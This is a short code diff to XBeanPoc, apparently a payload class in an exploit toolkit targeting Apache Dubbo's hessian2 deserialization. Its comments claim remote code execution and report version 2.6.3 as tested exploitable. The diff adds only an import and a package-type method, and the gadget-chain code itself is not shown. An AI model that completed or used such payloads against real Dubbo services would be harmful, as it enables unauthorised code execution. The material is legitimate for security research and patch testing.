@@ -1,5 +1,6 @@
 package com.threedr3am.exp.dubbo.payload.hessian;
 
+import com.threedr3am.exp.dubbo.payload.PackageType;
 import com.threedr3am.exp.dubbo.payload.Payload;
 import com.threedr3am.exp.dubbo.utils.Reflections;
 import com.threedr3am.exp.dubbo.utils.ToStringUtil;
@@ -11,7 +12,7 @@ import org.apache.xbean.naming.context.WritableContext;
 /**
  * dubbo 默认配置，即hessian2反序列化，都可RCE
  *
- * Spring环境可打，暂时测试Spring-boot打不了
+ * 经测试，2.6.3版本可打，其他版本暂未测试，与Spring版本无关了，仅与dubbo版本有关
  *
  * <dependency>
  *   <groupId>org.apache.xbean</groupId>
@@ -44,5 +45,10 @@ public class XBeanPoc implements Payload {
       e.printStackTrace();
     }
     return s;
+  }
+
+  @Override
+  public PackageType getPackageType() {
+    return PackageType.INVOKE;
   }
 }
